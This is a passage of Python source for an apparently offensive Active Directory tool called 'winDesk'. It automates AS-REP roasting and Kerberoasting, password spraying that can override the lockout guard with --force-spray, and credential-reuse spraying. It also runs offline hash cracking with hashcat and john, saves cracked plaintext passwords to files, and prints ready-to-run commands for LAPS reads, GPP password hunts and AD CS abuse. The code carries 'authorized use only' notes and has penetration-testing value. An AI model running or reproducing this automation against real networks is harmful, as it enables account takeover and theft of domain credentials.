    elif nxc and (inp.has_userlist or h.users):
        # NetExec module fallback
        ufile = userfile or resolve_list(inp.userlist, "userlist")
        if ufile:
            cmd = [nxc, "ldap", h.ip, "-u", ufile, "-p", "", "--asreproast", hashfile]
            rc, txt = run(cmd, timeout=400)
            ev(h, "asrep", cmd, txt)
            for m in re.finditer(r"(\$krb5asrep\$[^\s]+)", txt):
                got += _add_asrep_hash(h, None, m.group(1))
    else:
        skip("AS-REP roast needs GetNPUsers/nxc + a user source (userlist or discovered users)")
        mark(h, "asrep")
        return

    if got:
        crit(f"AS-REP roast retrieved {got} hash(es) → {hashfile}")
        STORE.add_finding(h.ip, "AS-REP Hashes Retrieved", "high",
                          f"{got} $krb5asrep$ hash(es)", "Crackable offline (hashcat 18200).",
                          ATTACK["asrep"], CWE["asrep"], 0.95, "validated")
        _render_hashes(h)
        _crack(h, inp, args, mode=18200, label="AS-REP", hashfile=hashfile)
    else:
        info("No AS-REP-roastable accounts returned (pre-auth required for all tried users)")
    mark(h, "asrep")


def _add_asrep_hash(h, user, blob):
    blob = (blob or "").strip()
    if not blob.startswith("$krb5asrep$"):
        return 0
    if any(x["hash"] == blob for x in h.hashes):
        return 0
    u = user
    if not u:
        m = re.search(r"\$krb5asrep\$(?:\d+\$)?([^@:$]+)", blob)
        u = m.group(1) if m else "?"
    h.hashes.append({"type": "asrep", "mode": 18200, "account": u, "hash": blob})
    _add_user(h, u, "asrep")
    return 1


# ============================================================================
#  PHASE 6B — KERBEROASTING  (needs a valid domain credential)
# ============================================================================
def phase_kerberoast(h, inp, args, prof, cred):
    if done(h, "kerberoast") or args.safe:
        return
    if 88 not in h.ports:
        mark(h, "kerberoast")
        return
    dom = h.domain or inp.domain or args.domain or ""
    if not dom or not cred or not cred.get("username"):
        return  # not marked: becomes eligible once a credential is obtained
    head(f"Kerberoasting · {h.ip}")
    gus = impacket_tool("GetUserSPNs")
    os.makedirs(args.output, exist_ok=True)
    hashfile = os.path.join(args.output, f"kerb_{h.ip}.hash")
    got = 0
    if gus:
        cr = (f"{dom}/{cred['username']}:{cred['password']}" if cred.get("password")
              else f"{dom}/{cred['username']}")
        cmd = [gus, cr, "-dc-ip", h.ip, "-request", "-outputfile", hashfile]
        if cred.get("nthash"):
            cmd += ["-hashes", cred["nthash"]]
        info(" ".join(c if ":" not in c else c.split(':')[0] + ":***@" if '@' in c else c
                      for c in cmd))
        rc, txt = run(cmd, timeout=400)
        ev(h, "kerberoast", cmd, txt, f"auth:{cred['username']}")
        for m in re.finditer(r"(\$krb5tgs\$[^\s]+)", txt):
            got += _add_tgs_hash(h, m.group(1))
        try:
            if os.path.exists(hashfile):
                for ln in open(hashfile, errors="ignore"):
                    if ln.strip().startswith("$krb5tgs$"):
                        got += _add_tgs_hash(h, ln.strip())
        except Exception:
            pass
    else:
        skip("GetUserSPNs not installed — Kerberoast skipped")
        mark(h, "kerberoast")
        return
    if got:
        crit(f"Kerberoast retrieved {got} TGS hash(es) → {hashfile}")
        STORE.add_finding(h.ip, "Kerberoast Hashes Retrieved", "high",
                          f"{got} $krb5tgs$ hash(es)", "Crackable offline (hashcat 13100).",
                          ATTACK["kerberoast"], CWE["kerberoast"], 0.95, "validated")
        _render_hashes(h)
        _crack(h, inp, args, mode=13100, label="Kerberoast", hashfile=hashfile)
    else:
        info("No SPN accounts returned for this credential")
    mark(h, "kerberoast")


def _add_tgs_hash(h, blob):
    blob = (blob or "").strip()
    if not blob.startswith("$krb5tgs$"):
        return 0
    if any(x["hash"] == blob for x in h.hashes):
        return 0
    m = re.search(r"\*([^*$]+)\$", blob)
    u = m.group(1) if m else "?"
    h.hashes.append({"type": "kerberoast", "mode": 13100, "account": u, "hash": blob})
    return 1


# ============================================================================
#  PHASE 6C — PASSWORD SPRAYING  (lockout-aware; executes with nxc)
# ============================================================================
def phase_spray(h, inp, args, prof, strat):
    if done(h, "spray") or args.safe:
        return
    if 445 not in h.ports and 389 not in h.ports and 88 not in h.ports:
        mark(h, "spray")
        return
    if not strat.can_spray:
        mark(h, "spray")
        return
    nxc = nxc_bin()
    if not nxc:
        skip("NetExec/CME not installed — password spray skipped")
        mark(h, "spray")
        return
    dom = h.domain or inp.domain or args.domain or ""

    # --- user source ---
    users_file, users_desc, n_users = strat.spray_user_source(h, args)
    if not users_file and not strat.single_user:
        skip("Spray has no user source yet (need discovered users, --userlist, or -u)")
        return  # not marked — may unlock after user discovery

    # --- lockout guard (SMART) ---
    pol = h.smb.get("password_policy", {})
    thr = pol.get("lockout_threshold")
    n_pass = strat.spray_pass_count(h)
    budget, guard_note = _spray_budget(thr, n_pass, args.force_spray)
    head(f"Password Spraying · {h.ip}")
    tbl(["SPRAY PLAN", "VALUE"],
        [["user source", users_desc],
         ["users", str(n_users)],
         ["password source", strat.spray_pass_desc()],
         ["passwords", str(n_pass)],
         ["lockout threshold", str(thr) if thr is not None else "UNKNOWN"],
         ["safe budget / user", "unlimited" if budget is None else str(budget)],
         ["guard", guard_note]],
        title="Lockout-aware spray")
    if budget == 0:
        warn("Lockout guard blocked spraying (would risk lockout). Use --force-spray to override "
             "or supply fewer passwords.")
        mark(h, "spray")
        return

    proto = "smb" if 445 in h.ports else ("ldap" if 389 in h.ports else "kerberos")
    hits = []
    for pw_item in strat.spray_passwords(h, budget):
        u_arg = (["-u", users_file] if users_file else ["-u", strat.single_user])
        p_arg = ["-p", pw_item["arg"]]
        cmd = [nxc, proto, h.ip] + u_arg + p_arg
        if dom:
            cmd += ["-d", dom]
        cmd += ["--continue-on-success"]
        if proto == "smb" and nxc_supports("smb", "--no-bruteforce") and pw_item.get("is_file"):
            # one password per user per sweep — netexec --no-bruteforce aligns u[i]<->p[i];
            # for a single password string we just spray it across all users.
            pass
        safe_disp = cmd[:]
        try:
            pi = safe_disp.index("-p")
            if not pw_item.get("is_file"):
                safe_disp[pi + 1] = "***"
        except ValueError:
            pass
        info(" ".join(safe_disp))
        timeout = None if args.no_spray_timeout else args.spray_timeout
        rc, txt = run_monitored(cmd, timeout, "spray",
                                notice_at=min(300, timeout) if timeout else 300,
                                no_timeout_flag="--no-spray-timeout")
        ev(h, "spray", safe_disp, txt, "spray")
        for m in re.finditer(r"\[\+\]\s+([^\\\s]+)\\([^\s:]+):([^\s]+)\s*(\(Pwn3d!\))?", txt):
            d, u, p = m.group(1), m.group(2), m.group(3)
            if p in ("", "(Pwn3d!)"):
                continue
            # when spraying a file, nxc echoes the matching password in `p`
            secret = pw_item["arg"] if not pw_item.get("is_file") else p
            hit = _add_credential(h, u, secret, dom or d, source="spray",
                                  admin=bool(m.group(4)))
            if hit:
                hits.append((u, secret, bool(m.group(4))))
        if prof.spray_delay and pw_item is not None:
            time.sleep(prof.spray_delay)

    if hits:
        win(f"SPRAY HIT — {len(hits)} valid credential(s):")
        for u, secret, adm in hits:
            win(f"    {dom}\\{u} : {secret}" + ("   (Pwn3d! — local admin)" if adm else ""))
        STORE.add_finding(h.ip, "Valid Credentials via Password Spray", "critical",
                          f"{len(hits)} credential(s) recovered",
                          "Authentication succeeded — ACCESS.", ATTACK["spray"],
                          CWE["weak-pass"], 0.98, "validated")
    else:
        info("No credentials recovered from the spray")
    mark(h, "spray")


def _spray_budget(thr, n_pass, force):
    """Decide how many passwords per user are safe. Returns (budget, note).
    budget None = unlimited; 0 = blocked."""
    if force:
        return None, "FORCED (--force-spray): lockout guard disabled"
    try:
        t = int(thr) if thr not in (None, "None", "") else None
    except Exception:
        t = None
    if t == 0:
        return None, "lockout disabled (threshold=0) — safe to spray full list"
    if t is None:
        return (1, "lockout UNKNOWN — safest: 1 password/user this run")
    safe_n = max(0, t - 2)  # leave headroom of 2 to never trip lockout
    if safe_n == 0:
        return 0, f"threshold={t} too low to spray safely without --force-spray"
    return safe_n, f"threshold={t} → cap at {safe_n}/user (headroom of 2)"


# ============================================================================
#  POST-CREDENTIAL — CREDENTIAL REUSE SPRAY (T1110.004)
# ============================================================================
def phase_spray_reuse(h, inp, args, prof):
    """Take every recovered secret and spray it across ALL known users — classic
    AD password-reuse win. Credential access only (nxc authentication check)."""
    if done(h, "spray-reuse") or args.safe:
        return
    secrets = sorted({c.get("password", "") for c in h.credentials if c.get("password")})
    users = h.user_names()
    nxc = nxc_bin()
    if not nxc or not secrets or len(users) < 2 or 445 not in h.ports:
        mark(h, "spray-reuse")
        return
    head(f"Credential Reuse-Spray · {h.ip}")
    dom = h.domain or inp.domain or args.domain or ""
    uf = os.path.join(args.output, f"reuse_users_{h.ip}.txt")
    try:
        os.makedirs(args.output, exist_ok=True)
        open(uf, "w", encoding="utf-8").write("\n".join(users) + "\n")
    except Exception:
        uf = None
    info(f"Reusing {len(secrets)} recovered secret(s) against {len(users)} known user(s)")
    hits = []
    for secret in secrets:
        u_arg = ["-u", uf] if uf else ["-u", users[0]]
        cmd = [nxc, "smb", h.ip] + u_arg + ["-p", secret]
        if dom:
            cmd += ["-d", dom]
        cmd += ["--continue-on-success"]
        disp = cmd[:]
        disp[disp.index("-p") + 1] = "***"
        info(" ".join(disp))
        timeout = None if args.no_spray_timeout else args.spray_timeout
        rc, txt = run_monitored(cmd, timeout, "reuse-spray",
                                notice_at=min(300, timeout) if timeout else 300,
                                no_timeout_flag="--no-spray-timeout")
        ev(h, "spray", disp, txt, "reuse")
        for m in re.finditer(r"\[\+\]\s+([^\\\s]+)\\([^\s:]+):([^\s]+)\s*(\(Pwn3d!\))?", txt):
            d, u = m.group(1), m.group(2)
            if _add_credential(h, u, secret, dom or d, source="reuse-spray",
                               admin=bool(m.group(4))):
                hits.append((u, secret, bool(m.group(4))))
    if hits:
        win(f"REUSE HIT — {len(hits)} more credential(s) via password reuse:")
        for u, secret, adm in hits:
            win(f"    {dom}\\{u} : {secret}" + ("   (Pwn3d!)" if adm else ""))
        STORE.add_finding(h.ip, "Password Reuse Across Accounts", "critical",
                          f"{len(hits)} account(s) share a recovered password",
                          "Shared/reused credentials.", ATTACK["spray"],
                          CWE["weak-pass"], 0.95, "validated")
    else:
        info("No additional accounts reuse the recovered password(s)")
    mark(h, "spray-reuse")


# ============================================================================
#  POST-CREDENTIAL — AD CS TRIAGE (certipy find; enumeration of vuln templates)
# ============================================================================
def phase_adcs(h, inp, args, cred):
    if done(h, "adcs") or args.safe:
        return
    if not cred or not cred.get("username"):
        return
    certipy = which_any("certipy-ad", "certipy")
    if not certipy:
        mark(h, "adcs")
        return
    dom = h.domain or inp.domain or args.domain or ""
    head(f"AD CS Triage (certipy find) · {h.ip}")
    os.makedirs(args.output, exist_ok=True)
    out = os.path.join(args.output, f"certipy_{h.ip}")
    cmd = [certipy, "find", "-u", f"{cred['username']}@{dom}" if dom else cred["username"],
           "-dc-ip", h.ip, "-vulnerable", "-stdout"]
    if cred.get("nthash"):
        cmd += ["-hashes", cred["nthash"]]
    elif cred.get("password"):
        cmd += ["-p", cred["password"]]
    disp = cmd[:]
    if "-p" in disp:
        disp[disp.index("-p") + 1] = "***"
    info(" ".join(disp))
    rc, txt = run(cmd, timeout=240)
    ev(h, "adcs", disp, txt, f"auth:{cred['username']}")
    escs = sorted(set(re.findall(r"(ESC\d+)", txt)))
    cas = re.findall(r"CA Name\s*:\s*(.+)", txt)
    rows = [["CAs found", str(len(cas)) + (": " + ", ".join(c.strip() for c in cas[:4])
                                           if cas else "")],
            ["Vulnerable templates", ", ".join(escs) if escs else "none flagged"]]
    tbl(["AD CS", "RESULT"], rows, title="certipy find -vulnerable")
    if escs:
        crit(f"AD CS vulnerable to {', '.join(escs)} — certificate-based privilege path")
        STORE.add_finding(h.ip, f"AD CS Vulnerable Templates ({', '.join(escs)})", "critical",
                          f"certipy flagged {', '.join(escs)}",
                          "Certificate-based credential/esc path.", ATTACK["adcs"], "",
                          0.9, "validated",
                          next_step="certipy req … then authenticate with the PFX (manual).")
    mark(h, "adcs")


# ============================================================================
#  POST-CREDENTIAL — BLOODHOUND COLLECTION (attack-path graph; enumeration)
# ============================================================================
def phase_bloodhound(h, inp, args, cred):
    if done(h, "bloodhound") or args.no_bloodhound:
        return
    if not cred or not cred.get("username"):
        return
    bh = which_any("bloodhound-python")
    if not bh:
        mark(h, "bloodhound")
        return
    dom = h.domain or inp.domain or args.domain or ""
    if not dom:
        mark(h, "bloodhound")
        return
    head(f"BloodHound Collection · {h.ip}")
    os.makedirs(args.output, exist_ok=True)
    cmd = [bh, "-u", cred["username"], "-d", dom, "-dc", h.fqdn or h.ip, "-ns", h.ip,
           "-c", ("DCOnly" if prof_is_stealthy(args) else "All"), "--zip"]
    if cred.get("nthash"):
        cmd += ["--hashes", cred["nthash"]]
    elif cred.get("password"):
        cmd += ["-p", cred["password"]]
    disp = cmd[:]
    if "-p" in disp:
        disp[disp.index("-p") + 1] = "***"
    info(" ".join(disp) + f"   (output dir: {args.output})")
    rc, txt = run(cmd, timeout=400)
    ev(h, "bloodhound", disp, txt, f"auth:{cred['username']}")
    zips = re.findall(r"(\S+\.zip)", txt)
    if zips or "Done" in txt or rc == 0:
        ok(f"BloodHound data collected → import the .zip into BloodHound for path analysis")
        STORE.add_finding(h.ip, "BloodHound Graph Collected", "informational",
                          "AD graph collected for path analysis", "",
                          ATTACK["bloodhound"] if "bloodhound" in ATTACK else ["T1087.002"],
                          "", 0.8, "validated")
    else:
        info("BloodHound collection returned no zip (check creds / DNS / connectivity)")
    mark(h, "bloodhound")


def prof_is_stealthy(args):
    return getattr(args, "approach", "noisy") == "stealthy"


# ============================================================================
#  CRACKING  (hashcat → john fallback; used by AS-REP and Kerberoast)
# ============================================================================
def _crack(h, inp, args, mode, label, hashfile):
    if args.no_crack:
        info(f"{label}: cracking disabled (--no-crack) — hashes saved to {hashfile}")
        return
    wl = resolve_list(inp.passlist, "passlist")
    if not wl:
        info(f"{label}: no wordlist available (supply --passlist) — hashes saved to {hashfile}")
        return
    subhead(f"{label} offline crack")
    cracked = {}
    hc = which_any("hashcat")
    jn = which_any("john")
    if not hc and not jn:
        info(f"{label}: neither hashcat nor john installed — hashes saved to {hashfile}")
        return

    # 1) hashcat (fast with a GPU). On GPU-less VMs it often needs --force and may
    #    still fail — we detect that and fall through to john.
    if hc:
        pot = os.path.join(args.output, "windesk.potfile")
        base = [hc, "-m", str(mode), hashfile, wl, "--potfile-path", pot]
        rc, txt = run(base + ["--show"], timeout=60)
        _parse_cracked(txt, cracked, mode)
        if not cracked:
            info(f"hashcat -m {mode} {os.path.basename(hashfile)} "
                 f"{os.path.basename(wl)} (timeout {args.crack_timeout}s)")
            rc, txt = run(base + ["--force", "-O", "--quiet"], timeout=args.crack_timeout)
            ev(h, "cred-crack", base, txt, "crack")
            if re.search(r"No devices found|No device|not enough|clGetPlatform", txt or "", re.I):
                warn("hashcat found no usable compute device — falling back to john")
            rc, txt = run(base + ["--show"], timeout=60)
            _parse_cracked(txt, cracked, mode)

    # 2) john fallback (reliable CPU cracking) — runs when hashcat recovered nothing.
    if not cracked and jn:
        fmt = "krb5asrep" if mode == 18200 else "krb5tgs"
        info(f"john --format={fmt} --wordlist={os.path.basename(wl)} "
             f"(timeout {args.crack_timeout}s)")
        rc, txt = run([jn, f"--format={fmt}", f"--wordlist={wl}", hashfile],
                      timeout=args.crack_timeout)
        ev(h, "cred-crack", [jn, f"--format={fmt}", "--wordlist", wl, hashfile], txt, "crack")
        rc, txt = run([jn, f"--format={fmt}", "--show", hashfile], timeout=60)
        _parse_cracked(txt, cracked, mode)

    dom = h.domain or inp.domain or args.domain or ""
    if cracked:
        for acct, pw in cracked.items():
            _add_credential(h, acct, pw, dom, source=f"crack:{label}")
        win(f"{label} CRACKED {len(cracked)} credential(s):")
        for acct, pw in cracked.items():
            win(f"    {dom + chr(92) if dom else ''}{acct} : {pw}")
        cfile = os.path.join(args.output, f"cracked_{h.ip}.txt")
        try:
            with open(cfile, "a", encoding="utf-8") as cf:
                for acct, pw in cracked.items():
                    cf.write(f"{dom}\\{acct}:{pw}\n")
            info(f"Cracked credentials saved -> {cfile}")
        except Exception:
            pass
        STORE.add_finding(h.ip, f"Cracked {label} Hash(es)", "critical",
                          f"{len(cracked)} password(s) recovered offline",
                          "Plaintext credential — ACCESS.", ATTACK["cred-crack"],
                          CWE["weak-pass"], 0.98, "validated")
    else:
        info(f"{label}: no hashes cracked with the supplied wordlist in "
             f"{args.crack_timeout}s (hashes saved to {hashfile}). "
             f"Try a bigger wordlist or raise --crack-timeout.")


def _parse_cracked(txt, out, mode):
    # hashcat --show prints  hash:password
    for ln in (txt or "").splitlines():
        if (mode == 18200 and ln.startswith("$krb5asrep$")) or \
           (mode == 13100 and ln.startswith("$krb5tgs$")):
            parts = ln.rsplit(":", 1)
            if len(parts) == 2 and parts[1]:
                acct = "?"
                m = re.search(r"\$krb5asrep\$(?:\d+\$)?([^@:$]+)", ln) or \
                    re.search(r"\*([^*$]+)\$", ln)
                if m:
                    acct = m.group(1)
                out[acct] = parts[1]


def _add_credential(h, username, secret, domain="", source="", admin=False):
    username = (username or "").strip()
    if not username:
        return False
    if any(c["username"].lower() == username.lower() for c in h.credentials):
        return False
    h.credentials.append({"username": username, "password": secret, "domain": domain,
                          "source": source, "admin": admin, "ts": now()})
    _add_user(h, username, source)
    return True


# ============================================================================
#  SERVICE ENUMERATION
# ============================================================================
def phase_services(h, args, prof):
    if done(h, "services") or args.no_services:
        return
    head(f"Service Enumeration · {h.ip}")
    rows = []
    if 5985 in h.ports or 5986 in h.ports:
        port = 5985 if 5985 in h.ports else 5986
        try:
            conn = (http.client.HTTPSConnection(h.ip, port, timeout=6) if port == 5986
                    else http.client.HTTPConnection(h.ip, port, timeout=6))
            conn.request("POST", "/wsman", headers={"Content-Type": "application/soap+xml"})
            r = conn.getresponse()
            h.winrm = {"port": port, "auth": r.getheader("WWW-Authenticate", "")}
            rows.append(["WinRM", str(port), h.winrm["auth"] or "open"])
            STORE.add_finding(h.ip, "WinRM Exposed", "informational", f"WinRM {port}",
                              "Remote management surface.", ATTACK["winrm"], "", 0.7)
        except Exception:
            rows.append(["WinRM", str(port), "no WSMan response"])
    if 3389 in h.ports:
        h.rdp["open"] = True
        rows.append(["RDP", "3389", f"NLA={h.rdp.get('nla', '?')}"])
        STORE.add_finding(h.ip, "RDP Exposed", "informational", "RDP 3389",
                          "Remote desktop surface.", ATTACK["rdp"], "", 0.7)
    if 1433 in h.ports:
        h.mssql["open"] = True
        rows.append(["MSSQL", "1433", "open"])
    if 161 in h.ports and have("snmpwalk"):
        for comm in ("public", "private"):
            rc, txt = run(["snmpwalk", "-v", "2c", "-c", comm, "-t", "2", h.ip,
                           "1.3.6.1.2.1.1.5.0"], timeout=15)
            if rc == 0 and "STRING" in txt:
                rows.append(["SNMP", "161", f"community '{comm}'"])
                STORE.add_finding(h.ip, "SNMP Default Community", "medium",
                                  f"community '{comm}'", "Info disclosure.",
                                  ATTACK["snmp"], "", 0.85)
                break
    if 21 in h.ports:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((h.ip, 21))
            s.recv(1024)
            s.sendall(b"USER anonymous\r\n")
            s.recv(256)
            s.sendall(b"PASS a@a\r\n")
            if "230" in s.recv(256).decode("utf-8", "ignore"):
                rows.append(["FTP", "21", "anonymous allowed"])
                STORE.add_finding(h.ip, "Anonymous FTP", "medium", "anon login",
                                  "Unauthenticated file service.", ATTACK["ftp"], "", 0.85)
            s.close()
        except Exception:
            pass
    if 2049 in h.ports and have("showmount"):
        rc, txt = run(["showmount", "-e", h.ip], timeout=15)
        if "Export list" in txt:
            rows.append(["NFS", "2049", "exports readable"])
    tbl(["SERVICE", "PORT", "DETAIL"], rows, title="Services")
    mark(h, "services")


# ============================================================================
#  PHASE 9 — OPERATOR PLAYBOOK (remaining manual steps; reference only)
# ============================================================================
def phase_playbook(h, inp, args):
    if done(h, "playbook"):
        return
    dom = h.domain or inp.domain or args.domain or ""
    ip = h.ip
    cred = h.credentials[0] if h.credentials else None
    U = (cred["username"] if cred else inp.username) or "<USER>"
    P = (cred["password"] if cred else inp.password) or "<PASSWORD>"
    UL = inp.userlist or (os.path.join(args.output, f"users_{ip}.txt")
                          if h.users else "<userlist.txt>")
    PL = inp.passlist or "<passlist.txt>"
    D = dom or "<DOMAIN>"
    pb = h.playbook

    def add(label, cmd, why, atk=""):
        pb.append({"label": label, "cmd": cmd, "why": why, "attack": atk})

    if h.adcs.get("cas"):
        cred_s = f"-u {U}@{D} " + (f"-hashes {inp.nthash}" if inp.nthash else f"-p '{P}'")
        add("AD CS triage (ESC1-ESC16)",
            f"certipy find {cred_s} -dc-ip {ip} -vulnerable -stdout",
            "certificate services present — enumerate vulnerable templates", "T1649")
    if h.laps:
        add("LAPS read",
            f"netexec ldap {ip} -u {U} -p '{P}' -d {D} -M laps",
            f"{len(h.laps)} computer(s) expose LAPS", "T1555.006")
    if h.delegation:
        add("Delegation review",
            f"impacket-findDelegation {D}/{U}:{P} -dc-ip {ip}",
            f"{len(h.delegation)} delegation condition(s)", "T1134.001")
    if any(p in h.ports for p in (389, 636)) and dom:
        cred_s = f"-u {U} -p '{P}'" if not inp.nthash else f"-u {U} --hashes {inp.nthash}"
        add("BloodHound graph",
            f"bloodhound-python {cred_s} -d {D} -dc {h.fqdn or ip} -ns {ip} -c All --zip",
            "collect the AD graph for path analysis", "T1087.002")
    if any(s.get("name", "").upper() in ("SYSVOL", "NETLOGON") for s in h.shares):
        add("GPP cpassword hunt",
            f"netexec smb {ip} -u '{U if cred else 'guest'}' "
            f"-p '{P if cred else ''}' -M gpp_password -M gpp_autologin",
            "SYSVOL/NETLOGON reachable — search for GPP cpassword", "T1552.006")

    if pb:
        head(f"Operator Next-Step Playbook · {h.ip}")
        warn("winDesk STOPS at access. The steps below (post-credential / out of scope "
             "for this tool) are for YOU to run deliberately on authorized targets.")
        tbl(["#", "STEP", "ATT&CK", "WHY"],
            [[str(i + 1), p["label"], p["attack"], p["why"]] for i, p in enumerate(pb)],
            title="Recommended next steps (manual)")
        for i, p in enumerate(pb):
            _emit(f"  {_c(C.BOLD)}{_c(C.YELLOW)}[{i + 1}] {p['label']}{_c(C.RESET)}")
            _emit(f"      {_c(C.WHITE)}{p['cmd']}{_c(C.RESET)}")
        _emit("")
    mark(h, "playbook")


# ============================================================================
#  SHARED PARSERS / RENDERERS
# ============================================================================
def _add_user(h, name, source, domain=None):
    name = (name or "").strip()
    if name and not any(x.get("username", "").lower() == name.lower() for x in h.users):
        h.users.append({"username": name, "source": source, "domain": domain or ""})


def _parse_nxc_fp(h, txt):
    for ln in (txt or "").splitlines():
        m = re.search(r"\(name:([^)]+)\)\s*\(domain:([^)]+)\)", ln)
        if m:
            h.hostname = h.hostname or m.group(1).strip()
            h.domain = h.domain or m.group(2).strip()
        m = re.search(r"\(signing:(\w+)\)", ln)
        if m:
            h.smb["signing"] = (m.group(1).lower() == "true")
        m = re.search(r"\(SMBv1:(\w+)\)", ln)
        if m and m.group(1).lower() == "true":
            h.smb["smbv1"] = True
        m = re.search(r"Windows\s+(.+?)\s+(?:x64|x86|Build\s+\d+)", ln)
        if m and not h.os_family:
            h.os_family = f"Windows {m.group(1)}".strip()


def _parse_shares(h, txt):
    in_t = False
    for ln in (txt or "").splitlines():
        if re.search(r"\bShare\b.*\bPermissions\b", ln):
            in_t = True
            continue
        if not in_t:
            continue
        m = re.search(r"\s(\S+)\s+(READ,WRITE|READ|WRITE|)\s*(.*)$", ln)
        if m and not m.group(1).startswith("---"):
            nm = m.group(1).strip()
            if nm and not any(s.get("name") == nm for s in h.shares):
                h.shares.append({"name": nm, "permissions": m.group(2),
                                 "remark": m.group(3).strip(), "source": "nxc"})


def _parse_users(h, txt, source):
    for ln in (txt or "").splitlines():
        m = re.search(r"\\([A-Za-z0-9._$-]+)\s", ln)
        if m:
            _add_user(h, m.group(1), source)


def _parse_rid(h, txt):
    for ln in (txt or "").splitlines():
        m = re.search(r"(\S+)\\(\S+)\s+\(RID:\s*(\d+)\)", ln)
        if m:
            _add_user(h, m.group(2), "rid-brute", m.group(1))


def _parse_passpol(h, txt):
    pol = {}
    for k, pat in (("min_length", r"Minimum password length:\s*(\d+)"),
                   ("lockout_threshold", r"Account Lockout Threshold:\s*(\d+|None)"),
                   ("complexity", r"Password Complexity Flags:\s*(\S+)")):
        m = re.search(pat, txt, re.I)
        if m:
            pol[k] = m.group(1)
    if pol:
        h.smb["password_policy"] = pol
        if pol.get("lockout_threshold") in ("0", "None"):
            STORE.add_finding(h.ip, "No Account Lockout", "medium",
                              f"Lockout threshold = {pol['lockout_threshold']}",
                              "Spraying feasible without lockout risk.",
                              ATTACK["spray"], CWE["no-lockout"], 0.85,
                              next_step="Spray executed in Phase 6C.")


def _render_shares(h):
    if h.shares:
        tbl(["SHARE", "PERMS", "REMARK"],
            [[s.get("name", ""), s.get("permissions", ""), s.get("remark", "")]
             for s in h.shares], title=f"Shares ({len(h.shares)})")


_LAST_UC: Dict[str, int] = {}


def _render_users(h):
    n = len(h.users)
    if n and _LAST_UC.get(h.ip) != n:
        _LAST_UC[h.ip] = n
        tbl(["USERNAME", "SOURCE"],
            [[u.get("username", ""), u.get("source", "")] for u in h.users[:30]],
            title=f"Accounts discovered: {n}" + (" (showing 30)" if n > 30 else ""))


def _render_hashes(h):
    if h.hashes:
        tbl(["ACCOUNT", "TYPE", "MODE"],
            [[x["account"], x["type"], str(x["mode"])] for x in h.hashes],
            title=f"Roasted hashes ({len(h.hashes)})")


def _render_credentials(h):
    if h.credentials:
        tbl(["USERNAME", "PASSWORD / SECRET", "DOMAIN", "SOURCE", "ADMIN"],
            [[c["username"], c.get("password", "") or "(hash/empty)", c.get("domain", ""),
              c.get("source", ""), "yes" if c.get("admin") else ""]
             for c in h.credentials],
            title=f"VALID CREDENTIALS ({len(h.credentials)})  — cleartext, authorized use only")


def _save_users(h, args):
    try:
        os.makedirs(args.output, exist_ok=True)
        p = os.path.join(args.output, f"users_{h.ip}.txt")
        open(p, "w", encoding="utf-8").write("\n".join(h.user_names()) + "\n")
        info(f"Users saved -> {p}")
    except Exception as e:
        warn(f"save users: {e}")


# ============================================================================
#  CORRELATION
# ============================================================================
def correlate(h):
    v = 0.0
    if h.os_family and "windows" in h.os_family.lower():
        v += 0.4
    if h.hostname:
        v += 0.1
    for p in (445, 135, 3389, 5985):
        if p in h.ports:
            v += 0.05
    for p in (88, 389):
        if p in h.ports:
            v += 0.1
    h.os_confidence = min(1.0, v)
    dc = sum(1 for p in (53, 88, 389, 445, 3268) if p in h.ports)
    nc = bool(h.ldap_base or h.ldap.get("defaultnamingcontext"))
    dn = bool(h.hostname and re.search(r"\b(DC|PDC|BDC|AD)\b", h.hostname.upper()))
    if dc >= 4 and (nc or h.domain) and dn:
        h.role, h.role_confidence = "Domain Controller", 0.98
    elif dc >= 4 and (nc or h.domain):
        h.role, h.role_confidence = "Domain Controller", 0.9
    elif dc >= 3 and h.domain:
        h.role, h.role_confidence = "Domain Controller (candidate)", 0.7
    elif 1433 in h.ports and 445 in h.ports:
        h.role, h.role_confidence = "SQL Server", 0.55
    elif 445 in h.ports and 135 in h.ports:
        h.role, h.role_confidence = "Member Server / Workstation", 0.5
    elif 445 in h.ports:
        h.role, h.role_confidence = "Windows Host", 0.4


def compute_next(h):
    na = h.next_actions
    if h.credentials:
        na.append("ACCESS GAINED — hand off to authorized post-exploitation (out of scope)")
    if h.spn_accounts and not any(x["type"] == "kerberoast" for x in h.hashes):
        na.append("Kerberoast — needs a valid cred (run again once sprayed/cracked)")
    if h.delegation:
        na.append("Delegation abuse review (authorized)")
    if h.adcs.get("cas"):
        na.append("AD CS template triage (certipy find -vulnerable)")
    if h.smb.get("signing") is False:
        na.append("NTLM relay feasibility (authorized)")


# ============================================================================
#  CREDENTIAL STRATEGIST  — reasons over ANY input combination
# ============================================================================
class CredentialStrategist:
    """Turns whatever the operator supplied (any mix of user/pass/hash/userlist/
    passlist/domain, or nothing) into a concrete, explainable set of capabilities
    and spray sources. This is where 'password without a username', 'userlist with
    one password', etc. get resolved into actions."""

    def __init__(self, inp: Inputs, args):
        self.inp = inp
        self.args = args
        self.single_user = inp.username or ""
        self.single_pass = inp.password or ""
        self.nthash = inp.nthash or ""
        self._desc = []  # host-derived description secrets, filled at spray time

    # -- high-level capability flags --
    @property
    def can_auth(self):
        return bool(self.single_user and (self.single_pass or self.nthash))

    @property
    def can_spray(self):
        # need at least one password source AND (a user source OR a single user)
        has_pw = bool(self.inp.has_passlist or self.single_pass)
        return has_pw and not self.args.safe

    def spray_pass_count(self, h):
        if self.inp.has_passlist:
            n = count_lines(resolve_list(self.inp.passlist, "passlist") or "")
            return n + (1 if self.single_pass else 0)
        base = 1 if self.single_pass else 0
        return base + len(h.__dict__.get("_desc_secrets", []))

    def spray_pass_desc(self):
        bits = []
        if self.inp.has_passlist:
            bits.append(f"passlist={os.path.basename(self.inp.passlist)}")
        if self.single_pass:
            bits.append("-p single password")
        bits.append("AD description secrets (if any)")
        return ", ".join(bits) or "none"

    def spray_user_source(self, h, args):
        """Return (users_file_or_None, description, count). Prefer discovered users,
        then --userlist, then the single -u user."""
        discovered = h.user_names()
        if discovered:
            f = os.path.join(args.output, f"spray_users_{h.ip}.txt")
            try:
                os.makedirs(args.output, exist_ok=True)
                open(f, "w", encoding="utf-8").write("\n".join(discovered) + "\n")
                return f, f"discovered users ({len(discovered)})", len(discovered)
            except Exception:
                pass
        if self.inp.has_userlist:
            ul = resolve_list(self.inp.userlist, "userlist")
            if ul:
                return ul, f"userlist={os.path.basename(ul)}", count_lines(ul)
        if self.single_user:
            return None, f"single user -u {self.single_user}", 1
        return None, "none", 0

    def spray_passwords(self, h, budget):
        """Yield password 'items' to spray, respecting the per-user budget.
        A passlist is sprayed as a FILE (nxc iterates it) counted as the whole
